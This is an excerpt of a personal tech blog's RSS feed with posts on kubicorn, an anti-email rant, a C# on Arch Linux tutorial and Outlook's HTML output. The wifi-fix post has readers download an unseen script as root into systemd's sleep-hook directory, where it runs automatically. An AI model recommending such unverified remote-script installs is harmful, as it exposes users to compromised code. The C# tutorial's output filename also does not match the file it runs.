+<p><a href="http://www.nivenly.com/wp-content/uploads/2018/03/kubicorn-patten.png"><img class="aligncenter wp-image-676 size-full" src="http://www.nivenly.com/wp-content/uploads/2018/03/kubicorn-patten.png" alt="" width="512" height="402" srcset="https://www.nivenly.com/wp-content/uploads/2018/03/kubicorn-patten.png 512w, https://www.nivenly.com/wp-content/uploads/2018/03/kubicorn-patten-300x236.png 300w, https://www.nivenly.com/wp-content/uploads/2018/03/kubicorn-patten-446x350.png 446w" sizes="(max-width: 512px) 100vw, 512px" /></a></p>
+<p>So this is an official working group of Kubernetes, and more information can be found <a href="https://github.com/kubernetes/community/tree/master/wg-cluster-api">here</a>!</p>
+<p>We are currently working on building out this framework, and if you think it is a good idea (like we do) feel free to get involved.</p>
+<ul>
+<li><a href="http://slack.k8s.io/">Slack channel</a> #kubicorn</li>
+<li><a href="https://groups.google.com/forum/#!forum/kubicorn-users-and-developers">Mailing List (with calendar invite to developer calls)</a></li>
+<li><a href="https://github.com/kubicorn/kubicorn">Github</a></li>
+</ul>
+<h3>We have a dope website</h3>
+<p><a href="http://kubicorn.io">kubicorn.io</a></p>
+<p>So many thanks to <a href="https://twitter.com/ellenkorbes">Ellen</a> for her hard work in building out our fabulous site. If you would like to contribute please let us know!</p>
+<h3>We have moved to our own GitHub organization</h3>
+<p>Despite my attempts to keep the project as one of my pets, it&#8217;s just gotten too big. It has now moved to it&#8217;s own organization. We would love for YOU to get involved. Just open up an issue or contact <strong>Kris Nova</strong> if you would like to join.</p>
+<h3>We are just now starting on the controller</h3>
+<p>Writing the infrastructure controller is probably the most exciting thing to happen to the project yet.</p>
+<p>We literally JUST started the <a href="https://github.com/kubicorn/controller">repository</a>. Get in now, while the getting is good!</p>
+<p>We need help with the Dockerfile, with the idea behind the controller, and even with the code to make it so. If you wan&#8217;t to get involved, now is your chance!</p>
+<h3>We want your help</h3>
+<p>Seriously.</p>
+<p>Our lead maintainer <a href="https://twitter.com/xmudrii">Marko</a> started out as someone on the internet just like you. He is now a super admin of the project, and is a rock star at keeping up with the day-to-day work of <code>kubicorn</code>.</p>
+<p>We would love to help you become a cloud native badass if you would like to contribute. Please join the <a href="http://slack.k8s.io/">slack channel</a> and start talking to us.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>And of course as always&#8230;</p>
+<p>&nbsp;</p>
+<h3>Let me know what you think in the comments below!</h3>
+]]></content:encoded>
+			<wfw:commentRss>https://www.nivenly.com/meanwhile-in-the-kubicorn-repository/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		</item>
+		<item>
+		<title>Emailing is rude</title>
+		<link>https://www.nivenly.com/emailing-is-rude/</link>
+		<comments>https://www.nivenly.com/emailing-is-rude/#comments</comments>
+		<pubDate>Sat, 28 Oct 2017 05:08:55 +0000</pubDate>
+		<dc:creator><![CDATA[Kris Nova]]></dc:creator>
+				<category><![CDATA[Unix]]></category>
+
+		<guid isPermaLink="false">http://www.nivenly.com/?p=643</guid>
+		<description><![CDATA[The SMTP protocol originated in 1982. According to Wikipedia most large email providers have proprietary protocols for exchanging data, all of them use SMTP while delivering outside the scope of their know protocol. I have put together a list of truths about email to bring to lite how utterly rude and lazy it is to [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>The <a href="https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol">SMTP protocol originated in 1982</a>.</p>
+<p>According to Wikipedia most large email providers have proprietary protocols for exchanging data, all of them use SMTP while delivering outside the scope of their know protocol.</p>
+<p>I have put together a list of truths about email to bring to lite how utterly rude and lazy it is to send another human an email and have an expectation that they take your request sincerely.</p>
+<p>&nbsp;</p>
+<h1>Emails are idempotent</h1>
+<blockquote><p>Ever tpoy in an email beofre?</p></blockquote>
+<p>I certainly have. Most communication standards today allow for updates to messages. Facebook, slack, Instagram, YouTube and many others all have an <code>edit</code> button next to your message.</p>
+<p>In fact, there is a company called Twitter that explicitly does <strong>NOT</strong> allow editing of a message. This is controversial but is ultimately part of what makes Twitter so trustworthy.</p>
+<p>There is a reasonable expectation that if a user is using Twitter, that they accept the fact that their messages are idempotent.</p>
+<p>Why in the hell do we think it&#8217;s a good idea to send idempotent messages to other humans to organize our thoughts? Organizing thoughts is notoriously hard and complicated, and it would be great if we had the ability to edit a thought after having it.</p>
+<p><strong>Guess what? Humans change their minds some times. </strong></p>
+<p>Imagine a text editor that didn&#8217;t let you use the <code>backspace</code> key.</p>
+<p>There is a reason we no longer have typewriters&#8230;</p>
+<h1>Reasons for sending email</h1>
+<p>I would say 99% of the emails I receive fit into one of the following categories.</p>
+<ol>
+<li>Dead end content</li>
+<li>Convenience</li>
+<li>Request for action</li>
+<li>Scheduling</li>
+</ol>
+<p>And if you think about it:</p>
+<p>2 is really just an extension of 1 and 4 is really just an extension of 3</p>
+<p>So to break it down even more granularly, here are really the 2 categories of email a person might receive</p>
+<ol>
+<li>Dead end content</li>
+<li>Request for action</li>
+</ol>
+<p>Every email I have ever received in my life is genuinely in one of these two buckets.</p>
+<h3>Dead end content</h3>
+<p>This is content that does not require action on your end. Usually it is sent as a convenience, FYI, or just to help me sender feel better.</p>
+<p>Ever get an email that just says <code>thanks</code>?</p>
+<p>Ever get an email where the subject contains <code>FYI</code>?</p>
+<p>There are so many reference emails that could hit your inbox that it takes large amounts of conscious effort to cipher through the noise. If you send these you should punch yourself in the face.</p>
+<p>Imagine buying a book that was packaged like your inbox and instead of having chapters and a table of contents was just a pile of pages without any order. It would be hard to read the book, and would require a lot of effort just to abstract the story from the pages.</p>
+<p>Furthermore what if some of the pages had requests for you to do something on them? And if you didn&#8217;t comply with the requests you would lose your job. <strong>Literally </strong>this is my inbox.</p>
+<p><strong>If you have something to say that does not require input or action from me it belongs on a web site, and not in my inbox. </strong></p>
+<h3>Request for action</h3>
+<p>This is probably the worst part of email. Humans actually do this, and I can&#8217;t understand why anyone thinks this is a rational thing to do.</p>
+<p><strong>Humans literally hide requests for action behind text blobs.</strong></p>
+<blockquote><p>Hi Kris,</p>
+<p>I was wondering if I could ask you a few questions?</p>
+<p>I was wondering if I could talk to you about my company BoringCorp. We are a successful startup from Silicon Valley and are on series F funding. Today is our 3 month anniversary in business. We were wondering if you would be interested in attending our inaugural company ball as a guest of honor? It would be an honor to have. I hope you are well.</p>
+<p>Regards,</p>
+<p>J</p>
+<p>&nbsp;</p></blockquote>
+<p>There is a large block of text above, but let me break it down what just happened.</p>
+<ol>
+<li>The sender sent a message with an expectation that I will respond to their request for attending their company ball.</li>
+<li> The sender did not provide all the information I would need to correctly respond to their request.</li>
+<li>The sender has implied that the event is important to them, so I should treat the request also as important.</li>
+<li>The sender sent a lot of information, and most of it isn&#8217;t relevant to the request.</li>
+<li>The sender&#8217;s name probably starts with J.</li>
+</ol>
+<p>So now not only do I have to invest time into deriving the request for action from the email, but the sender has burdened me with guilt if I do not comply with their request. Thanks.</p>
+<p>In the year 2017 we have an entire industry built around best ways to organize thoughts and ideas. We have large agile platforms like Jira, Asana, and Trello that help user&#8217;s organize tasks. In fact, in most cases there is a reasonable expectation that you <strong>won&#8217;t even be able to generate work without minimal criteria</strong>.</p>
+<p>Imagine a request for action that contained information like <strong>when</strong>, and <strong>where</strong>, and <strong>how to define success</strong>? Imagine if a user couldn&#8217;t even request action from you if it wasn&#8217;t delivered in a way that was meaningful to the person you are requesting action from? This is a reasonable expectation for other parts of the internet, but email just seems like forgive people for acting like complete asshats and requesting action via text blob.</p>
+<p>Imagine a restaurant that didn&#8217;t serve you a meal but rather gave you a huge blob of junk with your food buried somewhere in the pile of junk. That would be crazy. That restaurant clearly would not be successful if compared to restaurants that spend time and effort preparing a lovely meal for you.</p>
+<p>Because <strong>packaging</strong><strong> is important</strong>. And email encourages users to <strong>NOT</strong> <strong>package well;</strong> because the interface for sending an email is just a giant text field just waiting to be filled with complete garbage instead of small discreet text fields that represent minimal criteria for the person requesting action.</p>
+<h1>Emails come with implications</h1>
+<blockquote><p>hi,</p>
+<p>are u coming?</p>
+<p>J</p></blockquote>
+<p>This is a completely normal email for me to receive, and that is completely unreasonable.</p>
+<p>Here is what just happened</p>
+<ol>
+<li>J has covered their ass</li>
+</ol>
+<p>That&#8217;s it. Now if anything goes wrong it&#8217;s my fault because &#8220;Well I sent her an email about it&#8230;&#8221;</p>
+<p>But I don&#8217;t even need to explain all the things wrong with this message. It&#8217;s just completely bullshit content. There is nothing concrete here, and J seems to think I can just imply information like</p>
+<ul>
+<li>What would I be coming to?</li>
+<li>Where is this place at?</li>
+<li>When do I need to be at this place?</li>
+<li>Is this meeting important to you, or important to me? Neither? Both?</li>
+<li>Do I need to bring anything to the meeting?</li>
+<li>Is this even a meeting?</li>
+</ul>
+<p>Implying is bad, and usually humans get it wrong. Period.</p>
+<p>As it turns out, J was asking if I would be coming to the meeting he scheduled via text blob. It is important to him that I come to his text blob meeting.</p>
+<p>Meanwhile I am too busy getting shit done to deal with deciphering text blobs all day.</p>
+<h1>Emails are lazy</h1>
+<p>So it&#8217;s easy to just dump into a text field. Anyone can do it, and it doesn&#8217;t require much thought.</p>
+<p>Furthermore the act of sending an email is relatively safe, because the other person doesn&#8217;t have to respond immediately.</p>
+<p>So sending an email is a way for a human to send <strong>some</strong> message, without having to concern themselves about how it was packaged.</p>
+<p>Imagine if communication worked this way. Where you would just walk into a room and say whatever in the hell you wanted, and walked out with the expectation that whoever your message was intended for will receive and respond to your message.</p>
+<p><strong>If you send emails, you are lazy. </strong></p>
+<p>If you want me to take action, we first need to have a discussion about how we will work with action requests moving forward. After we come up with a way for us to work together, we can begin to create viable action items.</p>
+<p>If this sounds like too much work, consider how much time you spend deciphering bullshit from your inbox each day. I personally would be willing to trade time from me figuring out your bullshit, to you figuring out your own bullshit.</p>
+<p>Be awesome.</p>
+<p><strong>Figure your bullshit out first, so I don&#8217;t have to.</strong></p>
+<p>&nbsp;</p>
+<h1>Email clients are different.</h1>
+<p>Ever see an email that looks like this?</p>
+<p>&nbsp;</p>
+<blockquote><p>kris?</p>
+<p>&gt;</p>
+<p>&gt;</p>
+<p>&gt; &gt;</p>
+<p>&gt; &gt; &gt;</p>
+<p>&gt; &gt; &gt; &gt;</p>
+<p>&gt; &gt; &gt; &gt; &gt;</p>
+<p>&gt; &gt; &gt; &gt; hi,</p>
+<p>&gt; &gt; &gt; &gt; are you coming?</p>
+<p>&gt; &gt; &gt; &gt;</p>
+<p>&gt; &gt; &gt; &gt; J</p></blockquote>
+<p>Because my inbox is full of them.</p>
+<p>It seems that ever piece of software in the world respects the golden rule except email clients.</p>
+<p><strong>It&#8217;s never okay to mutate data that is not yours</strong></p>
+<p>Email clients fucking love to mutate your data. We are gonna add colors, and characters, and tabs and spaces. We are <a href="http://nivenly.com/j">gonna insert wingdings</a> into your email. You name it, we are gonna do it.</p>
+<p>So not only do I receive messages with vague text blobs that require <strong>effort</strong> on my end to understand, but chances are it&#8217;s not even the original bullshit text blob you sent anyway.</p>
+<p>&nbsp;</p>
+<h1>In conclusion</h1>
+<p>We need to figure out ways for humans to perform creating <strong>dead end content</strong> and <strong>requesting action</strong> that doesn&#8217;t involve email.</p>
+<p>In the mean time, can you please for fucks sake be considerate of your messages to me?</p>
+<p>I get upwards of 5 thousand messages a day, and the least you could do is spend a few seconds and make your message to me easily digestible.</p>
+<p>And remember, if it&#8217;s dead end content then put it on Facebook, or Twitter. If I like it I will give you a <img src="https://s.w.org/images/core/emoji/2.3/72x72/1f44d.png" alt="&#x1f44d;" class="wp-smiley" style="height: 1em; max-height: 1em;" />. But there is no reason to bundle that in with my other messages that may or may not be needing something from me.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h1>10 Rules for writing an email that doesn&#8217;t suck</h1>
+<p>&nbsp;</p>
+<h5>1. Start off the email by apologizing for using email.</h5>
+<p>Just get it out of the way, and admit you know what you are doing is evil. But please keep it short and sweet</p>
+<blockquote><p>Hi <code>$name</code>, sorry for sending you an email but <code>$content</code>?</p></blockquote>
+<p>&nbsp;</p>
+<h5>2. Respect the subject</h5>
+<p>The subject of an email is an important as naming a function. It should be descriptive enough to explain what the email is about, and still let a reader know what to expect within the content of the email.</p>
+<p>Furthermore, you should clearly define if your email is a <strong>request for action</strong>, or <strong>dead end content</strong>.</p>
+<p>&nbsp;</p>
+<p><img class="aligncenter wp-image-651 size-large" src="http://www.nivenly.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-28-at-10.26.32-AM-1024x83.png" alt="" width="640" height="52" srcset="https://www.nivenly.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-28-at-10.26.32-AM-1024x83.png 1024w, https://www.nivenly.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-28-at-10.26.32-AM-300x24.png 300w, https://www.nivenly.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-28-at-10.26.32-AM-768x62.png 768w, https://www.nivenly.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-28-at-10.26.32-AM-750x60.png 750w, https://www.nivenly.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-28-at-10.26.32-AM.png 1042w" sizes="(max-width: 640px) 100vw, 640px" /></p>
+<p>&nbsp;</p>
+<h5>3. No more than 1 reply. Ever.</h5>
+<p>The rule is simple, it is only okay for one person to reply to any email once before the email is locked and nobody else can reply. If you feel like you need to send another message, draft a new email with a new meaningful subject.</p>
+<p>&nbsp;</p>
+<h5>4. Do one thing and do it well.</h5>
+<p>Yep. I <code>Unix philosophy</code>&#8216;d you. Emails are only allowed to do one thing. If you combine multiple requests for action, or multiple sets of content in your email you are doing it wrong.</p>
+<h5></h5>
+<h5></h5>
+<h5>5. You get one sentence, use it wisely.</h5>
+<p>A complete sentence is used to express a complete thought. A <strong>single</strong> complete thought. Which means your email should never be longer than 1 sentence. If you are good, you can even combine that with your apology for using email.</p>
+<blockquote><p>Hi Kris, and I am so sorry for sending you an email, but I was wondering if you could attend our company ball [URL to more information about ball]?</p></blockquote>
+<p>&nbsp;</p>
+<h5>6. End your sentence with proper punctuation.</h5>
+<p>Always make sure to use proper punctuation at the end of your sentence. In the case your email ends with a period <code>.</code> you should copy/paste the email into a Tweet or Facebook post and not send the email.</p>
+<p>In the case your email ends with a question mark <code>?</code> you should re-read your email to make sure it&#8217;s well crafted and check your subject to make sure it&#8217;s meaningful. Then you may press send.</p>
+<h5></h5>
+<h5>7. No forwarding</h5>
+<p>Thats the rule, never forward email. If you forward email you are doing it wrong. You can copy/paste email content from one email to your personal blog. Then you can reference that blog from the next email you need to send.</p>
+<h5></h5>
+<h5>8. No more than one recipient</h5>
+<p>If you send an email to more than one person, or ever hit <code>reply all</code> you should punch yourself in the face. If you expect each person you are sending a message to to respond to your message you need to demonstrate that you are willing to spend that much time on them. They get a personal email, or no deal.</p>
+<h5></h5>
+<h5>9. Your signature must be smaller than 100 bytes</h5>
+<p>For your signature you get 3 choices</p>
+<ol>
+<li>Full legal name</li>
+<li>Preferred name</li>
+<li>Notable online handle</li>
+</ol>
+<p>Your signature should never be more than 100 bytes.</p>
+<h5></h5>
+<h5>10. No attachments</h5>
+<p>Ever. Never is it okay to attach anything to an email. You have two options for including media in your email:</p>
+<ol>
+<li>You may reference the media&#8217;s public URL</li>
+<li>You can opt out of using media.</li>
+</ol>
+]]></content:encoded>
+			<wfw:commentRss>https://www.nivenly.com/emailing-is-rude/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+		</item>
+		<item>
+		<title>Developing C# on Archlinux</title>
+		<link>https://www.nivenly.com/developing-c-on-archlinux/</link>
+		<comments>https://www.nivenly.com/developing-c-on-archlinux/#comments</comments>
+		<pubDate>Tue, 03 Oct 2017 16:23:57 +0000</pubDate>
+		<dc:creator><![CDATA[Kris Nova]]></dc:creator>
+				<category><![CDATA[Go]]></category>
+		<category><![CDATA[Msft]]></category>
+		<category><![CDATA[Unix]]></category>
+
+		<guid isPermaLink="false">http://www.nivenly.com/?p=597</guid>
+		<description><![CDATA[So I am working on a Go speech today, and I got to a slide where I wanted to mention the C# programming language. Or more importantly, I wanted to mention how some internal teams at Microsoft are switching over from C# to Go! The only problem with this slide is that I am supposed [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>So I am working on a Go speech today, and I got to a slide where I wanted to mention the C# programming language. Or more importantly, I wanted to mention how some internal teams at Microsoft are switching over from C# to Go!</p>
+<p><img class="size-medium wp-image-598 alignright" src="http://www.nivenly.com/wp-content/uploads/2017/10/img_2-300x216.jpeg" alt="" width="300" height="216" srcset="https://www.nivenly.com/wp-content/uploads/2017/10/img_2-300x216.jpeg 300w, https://www.nivenly.com/wp-content/uploads/2017/10/img_2-768x554.jpeg 768w, https://www.nivenly.com/wp-content/uploads/2017/10/img_2-1024x739.jpeg 1024w, https://www.nivenly.com/wp-content/uploads/2017/10/img_2-750x541.jpeg 750w, https://www.nivenly.com/wp-content/uploads/2017/10/img_2-485x350.jpeg 485w, https://www.nivenly.com/wp-content/uploads/2017/10/img_2.jpeg 1458w" sizes="(max-width: 300px) 100vw, 300px" />The only problem with this slide is that I am supposed to be somewhat credible in what I say..</p>
+<p style="text-align: center;"><strong> and I have never written a line of C# in my life. </strong></p>
+<p>Furthermore I run <strong>linux</strong> as my primary operating system. So of course I decided it would be a good idea to try to get a <strong>C#</strong> development environment up and and running on <strong>Archlinux</strong>. After a total of <strong>10 seconds of searching Google</strong> I couldn&#8217;t find the step-by-step tutorial I wanted so naturally I am creating one.</p>
+<p style="text-align: center;">So here goes&#8230;</p>
+<p>&nbsp;</p>
+<h1>Install VS Code</h1>
+<figure id="attachment_601" style="width: 300px" class="wp-caption alignright"><a href="http://www.nivenly.com/wp-content/uploads/2017/10/Screenshot-from-2017-10-03-09-47-15.png"><img class="wp-image-601 size-medium" src="http://www.nivenly.com/wp-content/uploads/2017/10/Screenshot-from-2017-10-03-09-47-15-300x185.png" alt="" width="300" height="185" srcset="https://www.nivenly.com/wp-content/uploads/2017/10/Screenshot-from-2017-10-03-09-47-15-300x185.png 300w, https://www.nivenly.com/wp-content/uploads/2017/10/Screenshot-from-2017-10-03-09-47-15-567x350.png 567w, https://www.nivenly.com/wp-content/uploads/2017/10/Screenshot-from-2017-10-03-09-47-15.png 662w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption class="wp-caption-text">C# isn&#8217;t scary at all!</figcaption></figure>
+<p><a href="https://code.visualstudio.com/docs/?dv=linux64">Download page for Linux</a></p>
+<p><a href="https://go.microsoft.com/fwlink/?LinkID=620884">Tarball for Linux</a></p>
+<p>Okay so you don&#8217;t need VS code, but the <strong>C#</strong> plugin is really legit. It feels like any other programming language!</p>
+<p>But feel free to use any text editor you like. We are just going to be banging out a quick and dirty hello world.</p>
+<p>If you plan on writing copious amounts of <strong>C#</strong> I strongly suggest you get VS code. It&#8217;s free and works fantastically on Linux.</p>
+<h1>Install Mono</h1>
+<p>(Seriously this is all you do)</p>
+<pre class="brush: bash; title: ; notranslate">
+
+sudo pacman -S mono
+
+</pre>
+<h1>Write your hello world program</h1>
+<p>Create a new file called <code>HelloWorld.cs</code> anywhere on your file system.</p>
+<p><strong>HelloWorld.cs</strong></p>
+<pre class="brush: csharp; title: ; notranslate">
+// A Hello World! program in C#.
+using System;
+namespace HelloWorld
+{
+    class Hello 
+    {
+        static void Main() 
+        {
+            Console.WriteLine(&quot;Hello World!&quot;);
+
+            // Keep the console window open in debug mode.
+            Console.WriteLine(&quot;Press any key to exit.&quot;);
+            Console.ReadKey();
+        }
+    }
+}
+</pre>
+<p>Thanks to the <a href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/inside-a-program/hello-world-your-first-program">official Microsoft docs</a> for the code snippet!</p>
+<h1>Compile</h1>
+<p>The mono <code>mcs</code> compiler works very similar to <code>gcc</code> and accepts an <code>-out</code> flag to specify the name of the executable.</p>
+<pre class="brush: bash; title: ; notranslate">
+
+mcs -out:helloexe HelloWorld.cs
+
+</pre>
+<h1>Run</h1>
+<p style="text-align: center;">Then you can run your program!</p>
+<pre class="brush: bash; title: ; notranslate">
+
+mono hello.exe
+
+</pre>
+<p><img class="wp-image-607 size-full aligncenter" src="http://www.nivenly.com/wp-content/uploads/2017/10/Screenshot-from-2017-10-03-10-16-43.png" alt="" width="389" height="255" srcset="https://www.nivenly.com/wp-content/uploads/2017/10/Screenshot-from-2017-10-03-10-16-43.png 389w, https://www.nivenly.com/wp-content/uploads/2017/10/Screenshot-from-2017-10-03-10-16-43-300x197.png 300w" sizes="(max-width: 389px) 100vw, 389px" /></p>
+<h1>What&#8217;s next?</h1>
+<p>I am going to do some benchmarking with <strong>C#</strong> and <strong>Go</strong> and explore some concurrency patterns between the two. Stay tuned for my findings!</p>
+]]></content:encoded>
+			<wfw:commentRss>https://www.nivenly.com/developing-c-on-archlinux/feed/</wfw:commentRss>
+		<slash:comments>3</slash:comments>
+		</item>
+		<item>
+		<title>Archlinux wifi fix for Microsoft Surface Book</title>
+		<link>https://www.nivenly.com/archlinux-wifi-fix-for-microsoft-surface-book/</link>
+		<comments>https://www.nivenly.com/archlinux-wifi-fix-for-microsoft-surface-book/#respond</comments>
+		<pubDate>Tue, 22 Aug 2017 13:34:40 +0000</pubDate>
+		<dc:creator><![CDATA[Kris Nova]]></dc:creator>
+				<category><![CDATA[Msft]]></category>
+		<category><![CDATA[Unix]]></category>
+		<category><![CDATA[Archlinux]]></category>
+		<category><![CDATA[bug]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Microsoft]]></category>
+		<category><![CDATA[not working]]></category>
+		<category><![CDATA[problem]]></category>
+		<category><![CDATA[wifi]]></category>
+
+		<guid isPermaLink="false">http://www.nivenly.com/?p=568</guid>
+		<description><![CDATA[So as I continue to find workarounds and fixes for running Archlinux on my Microsoft Surface Book I will post them.. Here is a great quick and dirty fix for the wifi issue. Problem After closing your Surface Pro, or sending your computer into a state of hibernation or suspension the WiFi agent quits working. [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>So as I continue to find workarounds and fixes for running Archlinux on my Microsoft Surface Book I will post them..</p>
+<p>Here is a great quick and dirty fix for the wifi issue.</p>
+<h1>Problem</h1>
+<p>After closing your Surface Pro, or sending your computer into a state of hibernation or suspension the WiFi agent quits working.</p>
+<h1>Solution</h1>
+<p>Found a handy dandy script that totally fixes the problem.</p>
+<pre class="brush: plain; title: ; notranslate">
+
+sudo wget -P /usr/lib/systemd/system-sleep nivenly.com/surface-hib.sh
+
+</pre>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+]]></content:encoded>
+			<wfw:commentRss>https://www.nivenly.com/archlinux-wifi-fix-for-microsoft-surface-book/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>The Secret of Microsoft Emails J</title>
+		<link>https://www.nivenly.com/j/</link>
+		<comments>https://www.nivenly.com/j/#comments</comments>
+		<pubDate>Wed, 07 Jun 2017 01:22:22 +0000</pubDate>
+		<dc:creator><![CDATA[Kris Nova]]></dc:creator>
+				<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[Unix]]></category>
+
+		<guid isPermaLink="false">http://www.nivenly.com/?p=409</guid>
+		<description><![CDATA[So a good friend of mine recently posted something on Twitter&#8230; So I decided to crank out a quick write up on the matter. It&#8217;s something that also bothered me for the longest time, and a few years ago when I was hired into a job that enforced using Outlook clients I finally got to [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>So a good friend of mine recently posted something on Twitter&#8230;<a href="https://twitter.com/jessfraz/status/872191760721686528" target="_blank" rel="noopener"><img class="aligncenter wp-image-415 size-large" src="http://www.nivenly.com/wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.42.15-1024x544.png" alt="screen-shot-2017-06-06-at-18-42-15" width="792" height="421" srcset="https://www.nivenly.com/wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.42.15-1024x544.png 1024w, https://www.nivenly.com/wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.42.15-300x159.png 300w, https://www.nivenly.com/wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.42.15-768x408.png 768w, https://www.nivenly.com/wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.42.15.png 1228w" sizes="(max-width: 792px) 100vw, 792px" /></a></p>
+<p>So I decided to crank out a quick write up on the matter. It&#8217;s something that also bothered me for the longest time, and a few years ago when I was hired into a job that enforced using Outlook clients I finally got to the bottom of it!</p>
+<p>Also I work at Microsoft, so I had the best testing ground in the world. I just set an email to a non-outlook email address from my work account. Let&#8217;s take a look and see what happened.</p>
+<h1 style="text-align: center;">From office 365<br />
+<img class="size-medium wp-image-411 alignleft" src="http://www.nivenly.com/wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.30.50-300x155.png" alt="screen-shot-2017-06-06-at-18-30-50" width="300" height="155" srcset="https://www.nivenly.com/wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.30.50-300x155.png 300w, https://www.nivenly.com/wp-content/uploads/2017/06/Screen-Shot-2017-06-06-at-18.30.50.png 592w" sizes="(max-width: 300px) 100vw, 300px" /></h1>
+<p>So that actually worked out as expected!</p>
+<p>It looks like the new Office 365 web client is on point and doing great.  Good job everyone!</p>
+<p>Heck, even the smiley face is the proper emoticon code <img src="https://s.w.org/images/core/emoji/2.3/72x72/1f60a.png" alt="&#x1f60a;" class="wp-smiley" style="height: 1em; max-height: 1em;" /> (<code>&amp;#x1F601;</code>)</p>
+<p>For clarity I went ahead and pulled to raw message, and ran a quick <code>base64</code> decode on it to get the following outputs.</p>
+<h4>raw</h4>
+<pre class="brush: xml; title: ; notranslate">
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
+    &lt;style type=&quot;text/css&quot; style=&quot;display:none;&quot;&gt;
+        &lt;!-- P {
+            margin-top: 0;
+            margin-bottom: 0;
+        }
+        
+        --&gt;
+    &lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body dir=&quot;ltr&quot;&gt;
+    &lt;div id=&quot;divtagdefaultwrapper&quot; style=&quot;font-size:12pt;color:#000000;font-family:Calibri,Helvetica,sans-serif;&quot; dir=&quot;ltr&quot;&gt;
+        &lt;p&gt;Hi everyone!&lt;/p&gt;
+        &lt;p&gt;
+            &lt;br&gt;
+        &lt;/p&gt;
+        &lt;p&gt;Just sending a quick testing email &lt;span&gt;<img src="https://s.w.org/images/core/emoji/2.3/72x72/1f60a.png" alt="&#x1f60a;" class="wp-smiley" style="height: 1em; max-height: 1em;" />&lt;/span&gt;&lt;/p&gt;
+        &lt;p&gt;&lt;span&gt;&lt;br&gt;
+&lt;/span&gt;&lt;/p&gt;
+        &lt;p&gt;
+            &lt;br&gt;
+        &lt;/p&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</pre>
+<p>But I know there are sinister email&#8217;s still lurking around the internet somewhere. Let&#8217;s dive deeper..</p>
+<h1 style="text-align: center;">From Outlook</h1>
+<p><img class="size-medium wp-image-422 alignleft" src="http://www.nivenly.com/wp-content/uploads/2017/06/ScreenShot2017-06-06at18.56.35-300x124.jpg" alt="screenshot2017-06-06at18-56-35" width="300" height="124" srcset="https://www.nivenly.com/wp-content/uploads/2017/06/ScreenShot2017-06-06at18.56.35-300x124.jpg 300w, https://www.nivenly.com/wp-content/uploads/2017/06/ScreenShot2017-06-06at18.56.35.jpg 562w" sizes="(max-width: 300px) 100vw, 300px" />I found an email in my archives when I tested this theory years ago. My only computer that runs the Outlook client is actually at the office, and I am lazy.</p>
+<p>Regardless, this sample is really what we are looking for!</p>
+<p>Here we can see that the <code>HTML</code> in the email does something fairly concerning. We didn&#8217;t get valid <code>HTML</code>. The email used a pseudo <code>HTML</code> markdown that was designed for word-processing style sheets, and does not adhere to the <code>ISO/IEC 15445</code> standard for <code>HTML!</code></p>
+<p>The markdown actually references some font logic that is defined as an <code>HTML</code> comment, as well as referencing a proprietary font!</p>
+<p>Hence why the font definitions aren&#8217;t being interpreted, and the user is left with an unfriendly looking email to read. Below is the decoded <code>base64</code> content.</p>
+<h4>raw</h4>
+<pre class="brush: xml; title: ; notranslate">
+&lt;html xmlns:o=&quot;urn:schemas-microsoft-com:office:office&quot; xmlns:w=&quot;urn:schemas-microsoft-com:office:word&quot; xmlns:m=&quot;http://schemas.microsoft.com/office/2004/12/omml&quot; xmlns=&quot;http://www.w3.org/TR/REC-html40&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
+    &lt;meta name=&quot;Title&quot; content=&quot;&quot;&gt;
+    &lt;meta name=&quot;Keywords&quot; content=&quot;&quot;&gt;
+    &lt;meta name=&quot;Generator&quot; content=&quot;Microsoft Word 15 (filtered medium)&quot;&gt;
+    &lt;style&gt;
+        &lt;!--
+        /* Font Definitions */
+        
+        @font-face {
+            font-family: Wingdings;
+            panose-1: 5 0 0 0 0 0 0 0 0 0;
+        }
+        
+        @font-face {
+            font-family: &quot;Cambria Math&quot;;
+            panose-1: 2 4 5 3 5 4 6 3 2 4;
+        }
+        
+        @font-face {
+            font-family: Calibri;
+            panose-1: 2 15 5 2 2 2 4 3 2 4;
+        }
+        /* Style Definitions */
+        
+        p.MsoNormal,
+        li.MsoNormal,
+        div.MsoNormal {
+            margin: 0in;
+            margin-bottom: .0001pt;
+            font-size: 12.0pt;
+            font-family: Calibri;
+        }
+        
+        a:link,
+        span.MsoHyperlink {
+            mso-style-priority: 99;
